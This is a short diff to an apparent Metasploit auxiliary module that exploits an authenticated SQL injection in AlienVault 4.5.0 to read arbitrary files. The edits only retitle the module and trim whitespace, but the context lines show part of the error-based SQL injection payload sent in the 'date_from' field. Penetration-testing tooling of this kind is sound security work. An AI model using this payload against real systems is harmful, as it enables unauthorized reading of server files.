@@ -11,10 +11,10 @@ class Metasploit4 < Msf::Auxiliary
 
   def initialize(info={})
     super(update_info(info,
-      'Name'           => "AlienVault 4.5.0 authenticated SQL injection arbitrary file read",
+      'Name'           => "AlienVault Authenticated SQL Injection Arbitrary File Read",
       'Description'    => %q{
       AlienVault 4.5.0 is susceptible to an authenticated SQL injection attack via a PNG
-      generation PHP file. This module exploits this to read an arbitrary file from 
+      generation PHP file. This module exploits this to read an arbitrary file from
       the file system. Any authed user should be usable. Admin not required.
       },
       'License'        => MSF_LICENSE,
@@ -80,7 +80,7 @@ class Metasploit4 < Msf::Auxiliary
       pay << "0x20)),#{(50*i)+1},50)),0x7169716d71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS"
       pay << " GROUP BY x)a) AND 'xnDa'='xnDa"
 
-      get = { 
+      get = {
         'date_from' => pay,
         'date_to' => '2014-03-30'
       }
